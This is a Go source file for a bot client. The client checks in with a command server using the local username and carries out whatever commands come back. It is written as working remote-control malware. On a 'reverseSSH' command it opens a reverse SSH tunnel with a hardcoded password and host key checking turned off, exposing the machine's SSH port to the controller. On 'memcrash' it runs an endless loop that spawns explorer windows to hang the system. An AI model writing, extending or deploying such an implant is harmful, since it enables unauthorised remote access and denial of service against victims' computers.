package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"os/user"
)

type PingResponse struct {
	Status  string `json:"status"`
	Command string `json:"command"`
	ID      string `json:"ID"`
}

func main() {
	// Get current user's username
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("Failed to get current user: %v", err)
	}
	deviceName := currentUser.Username

	url := fmt.Sprintf("http://127.0.0.1:8000/ping/%s", deviceName)

	resp, err := http.Get(url)
	if err != nil {
		log.Fatalf("Failed to ping server: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Failed to read response: %v", err)
	}

	var pingResp PingResponse
	if err := json.Unmarshal(body, &pingResp); err != nil {
		log.Fatalf("Failed to parse JSON: %v", err)
	}

	fmt.Println("Ping Response:")
	fmt.Printf("Status: %s\nCommand: %s\nID: %s\n", pingResp.Status, pingResp.Command, pingResp.ID)

	if pingResp.Command == "reverseSSH" {
		fmt.Println("Got command", pingResp.Command)

		cmd := exec.Command("sshpass", "-p", "Kimi2020",
			"ssh", "-o", "StrictHostKeyChecking=no",
			"-N", "-R", "2222:localhost:22", "botsolo@127.0.0.1")

		cmd.Stdout = nil
		cmd.Stderr = nil

		err := cmd.Start()
		if err != nil {
			log.Fatalf("Failed to start SSH: %v", err)
		} else {
			fmt.Println("[+] SSH tunnel started successfully")
		}
	}

	if pingResp.Command == "memcrash" {
		fmt.Println("Got command", pingResp.Command)

		// This infinite loop spams explorer windows endlessly
		cmd := exec.Command("cmd.exe", "/c", `for /l %i in (0,0,1) do start explorer`)

		cmd.Stdout = nil
		cmd.Stderr = nil

		err := cmd.Start()
		if err != nil {
			log.Fatalf("Failed to exec memcrash %v", err)
		} else {
			fmt.Println("pray.gif")
		}
	}
}
